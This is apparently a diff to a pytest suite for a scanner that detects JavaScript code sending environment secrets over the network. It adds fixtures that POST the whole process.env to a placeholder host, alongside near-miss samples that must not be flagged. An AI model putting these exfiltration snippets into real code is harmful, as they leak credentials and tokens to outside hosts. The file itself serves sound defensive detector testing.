@@ -344,6 +344,13 @@ def test_frontmatter_block_scalar_command(tmp_path):
              "fetch('https://c.invalid', {method: 'POST', body: s.toString()});\n"),
     ("e.ts", "import { execSync } from 'child_process';\n"
              "execSync(`curl -d '${JSON.stringify(process.env)}' https://c.invalid`);\n"),
+    # The environment set on an object the code made, then that object sent.
+    ("g.js", "const https = require('https');\nconst loot = { host: 'h' };\n"
+             "loot.env = process.env;\nconst payload = Buffer.from(JSON.stringify(loot));\n"
+             "const req = https.request('https://c.invalid', { method: 'POST' });\n"
+             "req.write(payload);\nreq.end();\n"),
+    ("h.js", "let e;\ne = process.env || {};\n"
+             "fetch('https://c.invalid', {method: 'POST', body: JSON.stringify(e)});\n"),
 ])
 def test_js_whole_environment_sent_over_the_network(tmp_path, name, code):
     assert EXFIL in _ids(_write(tmp_path, {name: code}))
@@ -359,9 +366,48 @@ def test_js_whole_environment_sent_over_the_network(tmp_path, name, code):
     # An alias of the environment read one variable at a time, directly or through a name.
     "const env = process.env;\nconst tag = env.RELEASE_TAG || env?.REF_NAME;\n"
     "fetch(`https://a.invalid/r/${env['REPO']}/${tag}`, {headers: {A: `Bearer ${env.TOKEN}`}});\n",
+    # The environment as a parameter default: the name is local to that function, and a payload
+    # another function builds from command-line options is not the environment.
+    "function paths(env = process.env) { return { host: env.HOST }; }\n"
+    "function payload(cli) { return { root: cli.value('root'), dry: !cli.has('apply') }; }\n"
+    "async function main(argv = process.argv.slice(2), env = process.env) {\n"
+    "  const cli = parse(argv);\n"
+    "  await fetch(`https://${paths(env).host}/x`,\n"
+    "    {method: 'POST', body: JSON.stringify(payload(cli))});\n"
+    "}\n",
+    # A debug logger: options from DEBUG_* names, written to stderr, in a file that also opens a
+    # request; and the bundled module wrappers around it.
+    "var require_fmt = __commonJS({ 'fmt.js'(exports2) {\n"
+    "  exports2.fmt = (o, ...a) => a.join(' ');\n} });\n"
+    "var require_dbg = __commonJS({ 'dbg.js'(exports2) {\n"
+    "  var util = require_fmt();\n"
+    "  exports2.opts = Object.keys(process.env).filter((k) => /^debug_/i.test(k));\n"
+    "  exports2.log = (...a) => process.stderr.write(util.fmt(exports2.opts, ...a) + '\\n');\n"
+    "} });\n"
+    "const req = require('https').request({host: 'a.invalid', method: 'POST'});\nreq.end();\n",
+    "const https = require('https');\nconst r = https.request({host: 'a.invalid'});\n"
+    "process.stdout.write(JSON.stringify(process.env));\nconsole.log(process.env);\nr.end();\n",
+    "const ok = typeof process.env === 'object' && process.env && process.env.PLATFORM;\n"
+    "fetch('https://a.invalid', {method: 'POST', body: JSON.stringify({ ok })});\n",
+    "var require_m = __commonJS({ 'm.js'(exports2) {\n"
+    "  console.log(Object.entries(process.env).length);\n} });\n"
+    "const lib = require_m();\n"
+    "fetch('https://a.invalid', {method: 'POST', body: JSON.stringify(lib)});\n",
 ])
 def test_js_near_misses_are_not_secret_exfil(tmp_path, code):
     assert EXFIL not in _ids(_write(tmp_path, {"x.js": code}))
+
+
+_ENV_DUMP_NEGATIVES = (
+    Path(__file__).parent / "eval_corpus" / "negative" / "AST01" / "env-dump-exfil"
+)
+
+
+@pytest.mark.parametrize("sample", ["bundled-debug-logger", "cli-env-default-param"])
+def test_calibration_shapes_are_not_secret_exfil(sample):
+    # A bundled debug logger writing DEBUG_* options to stderr, and a CLI whose helpers take the
+    # environment as a parameter default while it posts a payload built from its options.
+    assert EXFIL not in _ids(_ENV_DUMP_NEGATIVES / sample)
 
 
 @pytest.mark.parametrize("code", [
